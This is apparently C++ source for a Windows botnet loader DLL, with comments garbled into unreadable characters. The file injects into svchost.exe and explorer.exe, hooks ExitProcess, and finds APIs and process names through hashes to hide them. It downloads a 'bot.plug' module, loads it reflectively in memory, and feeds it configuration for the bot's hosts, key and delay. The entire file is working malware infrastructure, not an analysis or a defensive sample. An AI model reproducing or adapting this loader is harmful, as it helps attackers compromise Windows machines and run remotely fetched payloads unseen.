
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"
#include "DriverConnect.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define LDRDBG LDRDEBGTEMPLATES::DBGOutMessage<>

//----------------------------------------------------------------------------


PWCHAR SVChostName = L"svchost.exe";
char BotPlugin[] = {'b', 'o', 't', '.', 'p', 'l', 'u', 'g',  0};


namespace DLLLoader
{
	typedef VOID (WINAPI *TExitProcess)(UINT Code);

	TExitProcess Real_ExitProcess = NULL;

    HANDLE ThreadHandle = NULL; // ����� ����������� ������

	DWORD ExplorerPID = 0;
	bool DLLLoadedInExplorer = false;


	const static char LoaderSignalFileName[] = {'\\', 'n', 't', 'l', 'd', 'l', '.', 'i', 'n', 'f',  0};

	//------------------------------------------------------------------------
	PCHAR GetSignalFileName()
	{
		// ������� ���������� ��� ����������� �����


		// ���������� ��������� ����
		char WinDir[257];

		if (pGetWindowsDirectoryA(&WinDir[0], 256) == 0)
			return NULL;
        PCHAR Tmp = WinDir;
		while (*Tmp != ':') Tmp++;
		Tmp++;
		*Tmp = 0;
			
		// ������ ����� ���
		return STR::New(2, WinDir, (PCHAR)LoaderSignalFileName);
	}

	//------------------------------------------------------------------------

	VOID WINAPI Hook_ExitProcess(UINT Code)
	{
		// ������� ��������� �������, ����
		// ������� ����� �������� �������, �� ���������� ��� ����������
		if (ThreadHandle != NULL)
			pWaitForSingleObject(ThreadHandle, INFINITE);

		Real_ExitProcess(Code);
	}
	//------------------------------------------------------------------------

	void WaitExplorer()
	{
		// ������� ������� ������� ����������

		DWORD ID;
		DWORD I = 0;
		do
		{
			ID = GetProcessIdByHash(0x490A0972 /* explorer.exe */);
			I++;
			if (ID == -1)
				pSleep(1000);
		}
		while (ID == -1 && I < 90);
	}
	//------------------------------------------------------------------------

//	PCHAR GetBotPlugCacheFileName()
//	{
//		// ������� ���������� ��� ����� ���� �������
//		char Name[] = {'b', 'p', 'l', 'g', 'l', 's', 't', 'c', 'c', 'h', '.', 'c', 'a', 'c', 'h', 'e',  0};
//		return BOT::GetWorkPathInSysDrive(NULL, Name);
//	}

	//------------------------------------------------------------------------

	DWORD WINAPI DownloadMethod(LPVOID Data)
	{

       	// ������� �������� �������
		PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;
		
		LDRDBG("BRDS", "��������� �������� �� ��������� svchost.exe \r\n");

		DriverRemoveInjectToProcess(InitData, SVChostName);


		#ifdef DebugUtils
			for (DWORD i = 15; i > 0; i--)
			{
				LDRDBG("BRDS", "��� %d \r\n", i);
				pSleep(1000);
			}
		#else
			while (1)
			{
					WSADATA wsa;
					ClearStruct(wsa);
					DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
					if (Code == 0)
						break;
					else
						return 0; //pSleep(500);
			}
		#endif
		
		LDRDBG("BRDS", "������ �������� ������� ���� (V 10) \r\n");


		DWORD Size = 0;
		LPVOID Module = NULL;


		//��������� ����������

		LDRDBG("BRDS", "�������������� �������� �������!");

		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);

		if (Module != NULL)
		{
			// ��������� ������ � ���
			LDRDBG("BRDS", "��� ������� �������� \r\n");


            MemFree(Module);

			// �������� ����������� ��� � �������	
			// ��������� ������ ��� ������� � ������� ���������� �����

			// ���������� ��������� �� �������� �������� ���
        	LDRDBG("BRDS", "���������� ��������� \r\n");

			WaitExplorer();


			PCHAR Buf = "Ok: ";
			DriverSendDataToGlobalCallBack(InitData, &Buf, 4);
		}

		ThreadHandle = NULL; // ������������� ������ ��� ������ �� ����������

		return 0;
	}


	//------------------------------------------------------------------------
	BOOL StartLoaderThread(LPVOID SystemArgument)
	{
		// ��������� ����� �������� ���
		
		//===================================================
		// ���� 1. ��������� ������������� ����������� �����
		// ��� ����� �������� ���� � ������������ �������� �
		// �������� ��� �� �������� ����� ����������� �������
		// ����� ����� ��������� �� �����, ��� ���� ������
		// ������, ��� ������� ����������� �������� ��� �����
		//===================================================
		PCHAR FileName = GetSignalFileName();
		if (FileName == NULL) return false;

		// �������� ������� ���
		HANDLE H = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM , 0);
        if (H == INVALID_HANDLE_VALUE)
		{
			// ������ �������� �����, �������, ���
			// � ������ ������ ������ ������� ������ �������
		   STR::Free(FileName);
		   return false;
		}

		// ��������� �������, ��� ����� ����������� ����������
		// ������� ����

        pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);


		//===================================================
		// ���� 2: ������������� ���� ������� �����������
		// ���������� �������� �� ���������� ������ ������
		// ������
		//===================================================
		if ( HookApi(1, 0x95902B19 /* ExitProcess */, (DWORD)&Hook_ExitProcess ) )
			__asm mov [Real_ExitProcess], eax


		//===================================================
        //  ���� 3: ��������� �����
		//===================================================
		ThreadHandle = StartThread(DownloadMethod, SystemArgument);
		if (ThreadHandle == NULL)
		{
			pCloseHandle(H);
			return false;
        }
		pSetThreadPriority(ThreadHandle, THREAD_PRIORITY_NORMAL);

		return true;
    }

	//------------------------------------------------------------------------
}


//---------------------------------------------------------------------

typedef BOOL (WINAPI *TSetParam)(DWORD ID, PCHAR Value);

TSetParam SetParamMethod;

void SetParam(DWORD ID)
{
	// ������� �������� �������� �������
	DWORD Size = GetBotParameter(ID, NULL, 0);
	if (Size == 0) return;

	PCHAR Buf = STR::Alloc(Size + 1);
	GetBotParameter(ID, Buf, Size);

	SetParamMethod(ID, Buf);


	STR::Free(Buf);


}
//---------------------------------------------------------------------


void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
{

	HMEMORYMODULE Module = MemoryLoadLibrary(Buf);


	if (Module == NULL)
	{
		LDRDBG("BRDS Explorer", "�� ������� ��������� ��� � ������ \r\n");
		return;
    }

	const static char SetParamMethName[] = {'S', 'e', 't', 'B', 'o', 't', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r',  0};;
	SetParamMethod = (TSetParam)MemoryGetProcAddress(Module, (PCHAR)SetParamMethName);

	if (SetParamMethod != NULL)
	{
		// ������������� ��������� ����
		LDRDBG("BRDS Explorer", "������������� ��������� ���� \r\n");
		SetParam(BOT_PARAM_PREFIX);
		SetParam(BOT_PARAM_HOSTS);
		SetParam(BOT_PARAM_KEY);
		SetParam(BOT_PARAM_DELAY);
	}


	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);

	TStart Method = (TStart)MemoryGetProcAddress(Module, "Start");

	if (Method != NULL)
	{
			LDRDBG("BRDS Explorer", "��� ������� ������� \r\n");
			DLLLoader::DLLLoadedInExplorer = true;
			Method(NULL, NULL, NULL);
	
	}
}

//------------------------------------------------------------------------

bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
{
	LDRDBG("BRDS Explorer", "��������� ��� ���� \r\n");

	if (IsNewProcess(DLLLoader::ExplorerPID))
        DLLLoader::DLLLoadedInExplorer = false;


	if (DLLLoader::DLLLoadedInExplorer)
    	return true;


	LDRDBG("BRDS Explorer", "������ ������ �� ���� \r\n");
	DWORD Size = 0;
	LPBYTE Module = Plugin::DownloadFromCache(BotPlugin, true, NULL, &Size);

	if (Module != NULL)
	{

		// �������������� ����������
		if (DelayBeforeStart != 0)
        	pSleep(DelayBeforeStart);

		LDRDBG("BRDS Explorer", "��� ��������� � ������������ \r\n");
        ExplorerLoadDLL(InitData, Module, Size);

		MemFree(Module);
	}

	return DLLLoader::DLLLoadedInExplorer;
}
//------------------------------------------------------------------------

VOID WINAPI StartBotDll(LPVOID Reserved, PBUFFER_DATA Data, LPVOID lParam)
{
	DoStartBotDll(PUSER_INIT_NOTIFY(Data), 0);
}


//------------------------------------------------------------------------

DWORD WINAPI ExplorerStartProc(LPVOID Data)
{
	LDRDBG("BRDS", "�������� ������� ����������  \r\n");

	if (Data == NULL) 
	{
		LDRDBG("BRDS Explorer", "��������� ������ ��� ������ � ���������� \r\n");
		return 0;
	}

	PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;

	LDRDBG("BRDS Explorer", "������� ���� ������� �������� �������� �� ��������� svchost.exe \r\n");
	while (CheckIsInjectToProcess(InitData, SVChostName)) pSleep(300);


	LDRDBG("BRDS Explorer", "������ ������ ���������� \r\n");

	// ������ ����� �������� ��������� ��� �� �����
	
	if (DoStartBotDll(InitData, 5000))
	{	
		LDRDBG("BRDS Explorer", "��� ������� �������� �� ���� \r\n");
		return 0;
	} 

	// ������������ ������� �������� �����
	LDRDBG("BRDS Explorer", "������������ ����� �������� ����� � �������� Explorer \r\n");
	if (!DriverRegisterGlobalCallback(InitData, (DWORD)pGetCurrentThreadId(), StartBotDll, NULL))
	{
		LDRDBG("BRDS Explorer", "������ ����������� ������ �������� ���� ���������� \r\n");
		return 0;
	}

	// ��������� ����������� ���� ��������

	do
	{
		pSleepEx(10000, TRUE); 
		
	}while(1);

	return 0;
}
//------------------------------------------------------------------------

extern"C" __declspec(dllexport) VOID NTAPI  Start(
							PVOID  NormalContext /*��������� ���������*/,
							PUSER_INIT_NOTIFY  SystemArgument1 /*�������� ������� ����� ��������� ���� ������������ ������� � ���������*/,
							PVOID SystemArgument2/* ������ �� �����������*/)
{
	// �������� ����� �������� ���
	if (SystemArgument1 == NULL)
		return;


	// ���������� � ����� �������� ���������
	char Name[MAX_PATH];
	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;

	PCHAR ShortName = File::ExtractFileNameA(Name, false);

	DWORD Hash = STR::GetHash(ShortName, 0, true);

	if (Hash == 0x2608DF01 /* svchost.exe */)
	{

		PCHAR CL = (PCHAR)pGetCommandLineA();

		LDRDBG("BRDS", "������� ���������� ������ �������� svchost.exe \r\n");
		LDRDBG("BRDS", "��������� ������ svchost.exe - %s \r\n", CL);

	//	if (STR::Pos(CL, "localservice", 0, false) >= 0)
		{

			DLLLoader::StartLoaderThread(SystemArgument1);
		}
	}
	if (Hash == 0x490A0972 /* explorer.exe */)
	{
		// 
		LDRDBG("BRDS", "������� ���������� ������ ���������� \r\n");
		StartThread(ExplorerStartProc, SystemArgument1);
	}

};


#pragma comment(linker, "/ENTRY:LoaderDllMain" )

DWORD WINAPI LoaderDllMain(DWORD, DWORD, DWORD)
{
	return 0;
}